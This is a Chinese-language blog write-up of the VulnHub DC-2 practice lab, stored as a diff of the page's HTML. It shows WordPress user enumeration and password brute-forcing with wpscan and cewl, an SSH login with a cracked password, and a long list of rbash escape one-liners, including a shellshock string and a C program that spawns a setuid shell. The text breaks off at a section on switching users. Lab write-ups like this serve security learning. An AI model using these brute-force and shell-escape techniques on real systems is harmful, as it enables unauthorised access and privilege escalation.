@@ -1,0 +1,765 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"/><link rel="alternate" href="/rss.xml" title="梧桐虽立，其心以空，待发于春，实葬于冬" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="梧桐虽立，其心以空，待发于春，实葬于冬" type="application/atom+xml"><link rel="alternate" type="application/json" title="梧桐虽立，其心以空，待发于春，实葬于冬" href="https://zlaryy.top/feed.json"/><link rel="preconnect" href="https://s4.zstatic.net"/><link rel="preconnect" href="https://at.alicdn.com"/><link rel="modulepreload" href="/js/siteInit.js"></link><link rel="modulepreload" href="/js/nyx-player-HIXTN7KD.js"></link><link rel="modulepreload" href="/js/copy-tex-4AIDXWNJ.js"></link><link rel="modulepreload" href="/js/post-MYXPIC3N.js"></link><link rel="modulepreload" href="/js/chunk-T54OBHW4.js"></link><link rel="modulepreload" href="/js/index.esm-22UB7CNZ.js"></link><link rel="modulepreload" href="/js/chunk-HJSTZ4VX.js"></link><link rel="modulepreload" href="/js/chunk-ALXQBZTY.js"></link><link rel="stylesheet" href="/css/siteInit.css" media="none" onload="this.media&#x3D;&#39;all&#39;"></link><link rel="preload" href="/assets/picture1.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture6.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture3.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture5.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture1.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture2.webp" as="image" fetchpriority="high"><meta name="keywords" content="Web安全"/><meta name="description" content="Web安全 / CTF / AI安全 / 个人学习笔记"/><link rel="canonical" href="https://zlaryy.top/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/"><link rel="stylesheet" href="/css/post.css?v=0.5.4"><link rel="stylesheet" href="/css/mermaid.css?v=0.5.4"><!-- 临时处理--><link rel="stylesheet" media="none" onload="this.media='all'" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css"><title>DC-2靶场日记</title><!-- hexo injector head_end start --><style>.zlaryy-view-item{white-space:nowrap}.zlaryy-pageview-count{margin-inline-start:4px}.segments article.item>.info>.meta{display:flex;flex-wrap:wrap;column-gap:.65rem;row-gap:.2rem}.segments article.item>.info>.meta>.item{margin:0}</style><link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css">
+<link rel="stylesheet" href="/css/custom.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="pagefind_mount"></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">DC-2靶场日记</h1><div class="meta"><span class="item" title="创建时间：2026-11-03 17:22:00"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2026-11-03T17:22:00+08:00">2026-11-03</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>8.1k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>7 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ZLARYY</a></li></ul><ul class="right" id="rightNav"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><ul><li class="item" style="background-image: url(&quot;/assets/picture1.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture6.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture3.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture5.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture1.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture2.webp&quot;);"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" data-pagefind-body="data-pagefind-body" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://zlaryy.top/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avertar.png"/><meta itemprop="name" content="ZLARYY"/><meta itemprop="description" content=", Web安全 / CTF / AI安全 / 个人学习笔记"/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="梧桐虽立，其心以空，待发于春，实葬于冬"/></span><div class="body md" itemprop="articleBody"><h1 id="dc-2靶场日记"><a class="anchor" href="#dc-2靶场日记">#</a> DC-2靶场日记</h1>
+<p>靶场地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a></p>
+<p>参考文章：[VulnHub-<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/429009328">DC-1-7]-系列通关手册 - 知乎</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/LukeXJ/article/details/146914436">git提权-CSDN博客</a></p>
+<h1 id="寻找靶机ip并探测端口"><a class="anchor" href="#寻找靶机ip并探测端口">#</a> 寻找靶机IP并探测端口</h1>
+<p>第一步与DC-1靶场是一样的</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>sudo arp-scan -l</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/1.png" class=""></p>
+<p>找到靶机IP：<code>192.168.152.130</code></p>
+<p>探测靶机开放端口：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>nmap -sV -p- 192.168.152.130</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/2.png" class=""></p>
+<p>发现开放了80端口和7744端口</p>
+<h1 id="信息搜集"><a class="anchor" href="#信息搜集">#</a> 信息搜集</h1>
+<p>我们尝试直接访问这个IP地址，发现页面会显示无法访问，且输入的IP变成了<code>dc-2/</code></p>
+<p><img loading="lazy" src="/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/3.png" class=""></p>
+<p>这是后我们需要更改<code>/etc/hosts</code>文件添加一个IP域名指向：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>vim /etc/hosts</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/4.png" class=""></p>
+<p>如果我们想在Windows物理机上面实现成功访问的话还需要修改这个文件的文件内容：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>C:\Windows\System32\drivers\etc\hosts</span></span></code></pre>
+<p>在文件末尾添加相同的<code>192.168.152.130 dc-2</code>，保存之后就可以成功访问了</p>
+<p><img loading="lazy" src="/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/5.png" class=""></p>
+<p>通过Wappalyzer可以发现这是一个包含Wordpress（CMS）搭建起来的站点，并且有一个flag选项：</p>
+<p><img loading="lazy" src="/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/6.png" class=""></p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>Flag 1:</span></span>
+<span class="line"><span>Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</span></span>
+<span class="line"><span>More passwords is always better, but sometimes you just can’t win them all.</span></span>
+<span class="line"><span>Log in as one to see the next flag.</span></span>
+<span class="line"><span>If you can’t find it, log in as another.</span></span></code></pre>
+<p>这里提示我们需要用cewl来生成字典，字典越大越好，然后用一个身份登录进去之后拿到下一个flag</p>
+<p>但除了生成字典之外，我们还没有发现哪里有登录界面，所以需要进行dirsearch目录扫描</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>dirsearch -u "http://192.168.152.130"</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/7.png" class=""></p>
+<p>通过<code>wpscan</code>我们可以实现用户枚举：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>wpscan --url http://dc-2 --enumerate u</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/8.png" class=""></p>
+<p>wpscan：kali Linux自带的漏洞扫描工具，采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordpPress本身的漏洞，最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress，它不仅可以扫描类似<code>robots.txt</code>这样的敏感文件，而且能够检测当前已启用的插件和其他功能，该扫描器可以实现获取站点用户名，获取安装的所有插件、主题以及存在漏洞的插件、主题，并提供漏洞信息，同时还可以实现对未加防护的WordPress站点暴力破解用户名密码</p>
+<p>我们需要通过cewl爬取网站关键信息获取密码字典（-w表示写入文件的名称）：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>cewl http://dc-2/index.php/flag/ -w dict.txt</span></span></code></pre>
+<p>通过用户枚举可以得到admin、jerry、tom三个用户，接下来我们把他们写入users.txt然后爆破密码：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>vim users.txt</span></span>
+<span class="line"><span>wpscan --url http://dc-2/ -U users.txt -P dict.txt</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/9.png" class=""></p>
+<p>我们发现成功拿到了jerry和tom用户的密码，接下来我们尝试登录（通过dirsearch发现有<code>wp-login.php</code>，猜测是登录界面）</p>
+<p><img loading="lazy" src="/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/10.png" class=""></p>
+<p>成功登录并在page里面发现了flag2</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>If you can't exploit WordPress and take a shortcut, there is another way.</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Hope you found another entry point.</span></span></code></pre>
+<p>提示我们如果采用Wordpress走不了捷径的话试试采用其他方法，还记得我们之前nmap命令的时候不仅扫出了80端口，还有一个7744端口，试着用ssh登录：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>ssh tom@192.168.152.130 -p 7744</span></span>
+<span class="line"><span>password:parturient</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/11.png" class=""></p>
+<p>发现可以成功登录进去，一通命令执行查看查看结构</p>
+<p><img loading="lazy" src="/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/12.png" class=""></p>
+<p>发现被rbash，也就是说是被受限的shell，跟着参考文章学习一下怎么绕过：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/188989.html">Linux Restricted Shell绕过技巧总结 - FreeBuf网络安全行业门户</a></p>
+<h1 id="绕过restricted-shell"><a class="anchor" href="#绕过restricted-shell">#</a> 绕过Restricted shell</h1>
+<p><code>Resrticted shell</code>：即受限的shell，与一般的标准shell区别在于会限制执行一些行为，比如：用cd来改变路径，设置或取消SHELL，ENV或BASH_ENV变量的值，指定的命令名中包含<code>/</code></p>
+<p>最常见的实现是Bash的受限模式<code>rbash</code>，当Bash以这个名称启动的时候，或者使用了<code>-r / --restricted</code>选项时，就会进入受限模式，该模式在启动文件读取完毕时开始生效，并施加一系列关键限制：</p>
+<ul>
+<li>禁止改变目录：不能使用cd内建命令</li>
+<li>禁止修改关键环境变量：不能设置或取消<code>SHELL</code>，<code>PATH</code>，<code>HISTFILE</code>，<code>ENV</code>或<code>BASH_ENV</code>的值</li>
+<li>禁止使用包含斜杠<code>/</code>的命令或路径：这意味着无法通过完整路径<code>/bin/sh</code>来执行命令</li>
+<li>禁止输出重定向：不能使用<code>&gt;</code>，<code>&gt;&gt;</code>，<code>&gt;|</code>，<code>&lt;&gt;</code>，<code>&gt;&amp;</code>，<code>&amp;&gt;</code>等操作将输出写入文件</li>
+<li>禁止替换shell：不能使用<code>exec</code>内建命令来启动另一个程序替换当前shell</li>
+<li>禁止禁用或启用内建命令：限制了<code>enable</code>命令的相关选项，防止开启被禁用的功能</li>
+<li>禁止关闭受限模式：不能通过<code>set +r</code>或者<code>shopt -u restricted_shell</code>来关闭限制</li>
+</ul>
+<p>这些限制的核心逻辑是控制可执行命令的范围（通过限制PATH）和防止对文件系统的意外写入（通过禁止重定向和cd）</p>
+<h2 id="枚举linux环境"><a class="anchor" href="#枚举linux环境">#</a> 枚举Linux环境</h2>
+<p>首先是对环境进行一次探测，也就是信息搜集：</p>
+<ul>
+<li>
+<p>检查可用命令：如<code>cd</code>、<code>ls</code>、<code>echo</code>等</p>
+<p><img loading="lazy" src="/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/13.png" class=""></p>
+</li>
+<li>
+<p>检查可用的操作符：<code>&gt;</code>、<code>&gt;&gt;</code>、<code>&lt;</code>、<code>|</code>等</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># echo A;echo B</span></span>
+<span class="line"><span>A</span></span>
+<span class="line"><span>B</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># echo A &#x26;&#x26; echo B</span></span>
+<span class="line"><span>A</span></span>
+<span class="line"><span>B</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># false || echo 1</span></span>
+<span class="line"><span>1</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># echo `echo ZLARYY`</span></span>
+<span class="line"><span>ZLARYY</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># echo $(echo ZLARYY)</span></span>
+<span class="line"><span>ZLARYY</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># (echo ZLARYY)</span></span>
+<span class="line"><span>ZLARYY</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># echo 1 | while read line;do echo "$line";done</span></span>
+<span class="line"><span>1</span></span></code></pre>
+</li>
+<li>
+<p>root身份运行哪些命令：<code>sudo -l</code>（部分rbash情况下用不了）</p>
+</li>
+<li>
+<p>检查shell：<code>echo $SHELL</code>，基本上都是<code>/bin/rbash</code></p>
+</li>
+<li>
+<p>编程语言：检查可用的编程语言，如python、perl、ruby等</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># python</span></span>
+<span class="line"><span>-rbash: python: command not found</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># perl</span></span>
+<span class="line"><span>-rbash: perl: command not found</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># ruby</span></span>
+<span class="line"><span>-rbash: ruby: command not found</span></span></code></pre>
+</li>
+<li>
+<p>检查环境变量：执行env或者printenv：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># printenv</span></span>
+<span class="line"><span>-rbash: printenv: command not found</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># env</span></span>
+<span class="line"><span>-rbash: env: command not found</span></span></code></pre>
+</li>
+</ul>
+<h2 id="常见利用技术"><a class="anchor" href="#常见利用技术">#</a> 常见利用技术</h2>
+<h3 id="字符被允许"><a class="anchor" href="#字符被允许">#</a> <code>/</code>字符被允许</h3>
+<p>如果<code>/</code>被允许我们可以直接运行<code>/bin/bash</code>或者<code>/bin/sh</code>，不过在该靶场里面我们会看到<code>-rbash: /bin/bash: restricted: cannot specify `/' in command names</code></p>
+<p><img loading="lazy" src="/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/14.png" class=""></p>
+<h3 id="cp命令被允许"><a class="anchor" href="#cp命令被允许">#</a> cp命令被允许</h3>
+<p>如果cp命令被允许我们可以直接复制<code>/bin/bash</code>到本目录用户：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>cp /bin/bash kbash</span></span>
+<span class="line"><span>./kbash</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>cp /bin/sh ksh</span></span>
+<span class="line"><span>./ksh</span></span></code></pre>
+<h3 id="探测应用"><a class="anchor" href="#探测应用">#</a> 探测应用</h3>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># FTP</span></span>
+<span class="line"><span>ftp > !/bin/sh</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># GDB</span></span>
+<span class="line"><span>gdb > !/bin/sh</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># man/git</span></span>
+<span class="line"><span>man > !/bin/sh</span></span>
+<span class="line"><span>git > git help status</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># vim / vi</span></span>
+<span class="line"><span>!/bin/sh</span></span>
+<span class="line"><span>!/bin/bash</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># more/less</span></span>
+<span class="line"><span>!'sh'</span></span></code></pre>
+<p><code>ftp</code>表示启动FTP客户端，进入交互式命令界面<code>ftp&gt;</code>，然后输入<code>!/bin/sh</code>，其含义可拆分为：</p>
+<ul>
+<li><code>ftp&gt;</code>：FTP客户端的交互式提示符，不需要手动输入</li>
+<li><code>!</code>：在支持该功能的FTP客户端中，调用本地系统Shell执行命令</li>
+<li><code>/bin/sh</code>：Linux系统中的Shell解释器</li>
+</ul>
+<p>因此实际作用是尝试从FTP客户端启动本地<code>/bin/sh</code>，这里的<code>/bin/sh</code>是当前机器上的shell而不是远程FTP服务器上的shell</p>
+<p>其原理是部分FTP客户端支持通过<code>!</code>调用外部shell，<code>rbash</code>限制的是它自己解析和执行的命令，而某些被允许启动的程序仍可能具有执行其他程序的能力</p>
+<p>不过在DC-2靶场中很明显，无法通过ftp、gdb、man/git、vim进入交互界面：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>-rbash: ftp: command not found</span></span>
+<span class="line"><span>-rbash: gdb: command not found</span></span>
+<span class="line"><span>-rbash: /bin/sh: restricted: cannot redirect output</span></span>
+<span class="line"><span>-rbash: git: restricted: cannot redirect output</span></span>
+<span class="line"><span>-rbash: vim: command not found</span></span>
+<span class="line"><span>-rbash: more: command not found</span></span></code></pre>
+<p>但是可以用vi：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>vi</span></span>
+<span class="line"><span>:set shell=/bin/sh</span></span>
+<span class="line"><span>:shell</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/15.png" class=""></p>
+<p><img loading="lazy" src="/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/16.png" class=""></p>
+<p>接下来按回车就会进入新的命令行了</p>
+<p><img loading="lazy" src="/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/17.png" class=""></p>
+<p>不过似乎还是有点限制，需要我们更改PATH或SHELL环境变量</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 查看</span></span>
+<span class="line"><span>export -p</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/18.png" class=""></p>
+<p>这里需要我们修改PATH为<code>/usr/sbin:/usr/bin:/rbin:/bin</code>：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>export PATH="/usr/sbin:/usr/bin:/rbin:/bin"</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/19.png" class=""></p>
+<p>其中：</p>
+<ul>
+<li><code>/usr/sbin</code>：系统管理命令工具</li>
+<li><code>/usr/bin</code>：常用用户命令</li>
+<li><code>/sbin</code>：系统管理工具</li>
+<li><code>/bin</code>：基础命令工具</li>
+</ul>
+<p>在Restricted shell中，无法使用cat很可能不是因为cat命令被删除，而是PATH被可刻意限制，导致shell找不到cat程序，修改PATH为如上值之后，相当于让shell以后执行外部命令时可以到这四个目录中查找</p>
+<h3 id="set-shell"><a class="anchor" href="#set-shell">#</a> set shell</h3>
+<p>在一些编辑器或命令中可以设置shell变量然后执行，比如刚才在vi中执行的：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>:set shell=/bin/sh</span></span>
+<span class="line"><span>:shell</span></span></code></pre>
+<p>也可以在vim中执行</p>
+<h3 id="更改path或shell环境变量"><a class="anchor" href="#更改path或shell环境变量">#</a> 更改PATH或SHELL环境变量</h3>
+<p>用<code>export -p</code>查看</p>
+<p><img loading="lazy" src="/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/20.png" class=""></p>
+<p>这里我们发现PATH和SHELL变量都是<code>-rx</code>，这意味着我们只能执行而不能写入，如果可写就可以直接写入<code>/bin/bash</code>，或者将PATH修改为上述<code>PATH=&quot;/usr/sbin:/usr/bin:/rbin:/bin&quot;</code></p>
+<h3 id="编程语言"><a class="anchor" href="#编程语言">#</a> 编程语言</h3>
+<p>因为之前在信息搜集的时候发现没有语言可以使用（command not found），所以这里只给绕过姿势：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># python</span></span>
+<span class="line"><span>python -c 'import os; os.system("/bin/bash")'</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># php</span></span>
+<span class="line"><span>php -a then exec("sh -i");</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># perl</span></span>
+<span class="line"><span>perl -e 'exec "/bin/sh";'</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># lua</span></span>
+<span class="line"><span>os.execute('/bin/sh').</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># ruby</span></span>
+<span class="line"><span>exec "/bin/sh"</span></span></code></pre>
+<h3 id="最新技术"><a class="anchor" href="#最新技术">#</a> 最新技术</h3>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># ssh</span></span>
+<span class="line"><span>ssh username@IP - t "/bin/sh" or "/bin/bash"</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># ssh2</span></span>
+<span class="line"><span>ssh username@IP -t "bash --noprofile"</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># ssh</span></span>
+<span class="line"><span>ssh username@IP -t "() &#123; :; &#125;; /bin/bash" (shellshock)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># ssh4</span></span>
+<span class="line"><span>ssh -o ProxyCommand="sh -c /tmp/yourfile.sh" 127.0.0.1 (SUID)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># ZIP</span></span>
+<span class="line"><span>zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># tar</span></span>
+<span class="line"><span>tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># awk</span></span>
+<span class="line"><span>awk 'BEGIN &#123;system("/bin/bash")&#125;'</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># pico</span></span>
+<span class="line"><span>pico -s "/bin/bash"</span></span>
+<span class="line"><span>然后输入/bin/bash按CTRL + T</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># scp</span></span>
+<span class="line"><span>## scp -S program：指定加密传输时所用程序</span></span>
+<span class="line"><span>## spellbash.sh脚本功能在于给shell加权限执行</span></span>
+<span class="line"><span>scp -S ./spellbash.sh 127.0.0.1:/tmp/z.zip ./</span></span></code></pre>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># spellbash.sh代码如下</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>#include &#x3C;stdlib.h></span></span>
+<span class="line"><span>#include &#x3C;unistd.h></span></span>
+<span class="line"><span>#include &#x3C;stdio.h></span></span>
+<span class="line"><span>int main(int argc, char **argv, char **envp)</span></span>
+<span class="line"><span>&#123;</span></span>
+<span class="line"><span>    setresgid(getegid(), getegid(), getegid());</span></span>
+<span class="line"><span>    setresuid(geteuid(), geteuid(), geteuid());</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    execve("/bin/bash", argv,  envp);</span></span>
+<span class="line"><span>    return 0;</span></span>
+<span class="line"><span>&#125;</span></span></code></pre>
+<h1 id="切换用户"><a class="anchor" href="#切换用户">#</a> 切换用户</h1>
+<p>回到DC-2，根据flag3的内容：</p>
